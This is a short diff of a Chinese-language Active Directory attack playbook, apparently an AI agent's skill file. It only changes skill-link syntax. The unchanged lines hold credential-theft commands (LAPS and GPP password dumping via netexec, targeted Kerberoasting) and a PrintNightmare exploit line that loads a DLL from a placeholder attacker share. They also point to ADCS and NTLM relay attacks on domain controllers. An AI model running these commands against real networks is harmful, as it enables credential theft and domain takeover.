@@ -59,8 +59,8 @@ python3 targetedKerberoast.py -u ATTACKER -p PASS -d DOMAIN --dc-ip DC_IP
 ## 其他提权路径
 - **LAPS**：`netexec ldap DC_IP -u USER -p PASS -M laps` — 读取本地管理员密码
 - **GPP 密码**：`netexec smb DC_IP -u USER -p PASS -M gpp_password` — 组策略中的密码
-- **ADCS 攻击**：→ `read_skill(id="adcs-certipy-attack")` — 证书服务滥用（ESC1-ESC11）
-- **NTLM Relay**：→ `read_skill(id="ntlm-relay-attack")` — 中继攻击获取域控
+- **ADCS 攻击**：→ `/skill:adcs-certipy-attack` — 证书服务滥用（ESC1-ESC11）
+- **NTLM Relay**：→ `/skill:ntlm-relay-attack` — 中继攻击获取域控
 
 ## 域控攻击
 
@@ -105,10 +105,10 @@ python3 CVE-2021-1675.py DOMAIN/USER:PASS@DC_IP '\\ATTACKER_IP\share\payload.dll
 
 ### ADCS 攻击（ESC1-ESC11）
 证书服务是目前域渗透中最强大的攻击面：
-→ 完整 ADCS 攻击方法论 → `read_skill(id="adcs-certipy-attack")`
+→ 完整 ADCS 攻击方法论 → `/skill:adcs-certipy-attack`
 
 ### NTLM Relay 到域控
-→ 完整 NTLM 中继攻击 → `read_skill(id="ntlm-relay-attack")`
+→ 完整 NTLM 中继攻击 → `/skill:ntlm-relay-attack`
 
 ## GPO 滥用
 
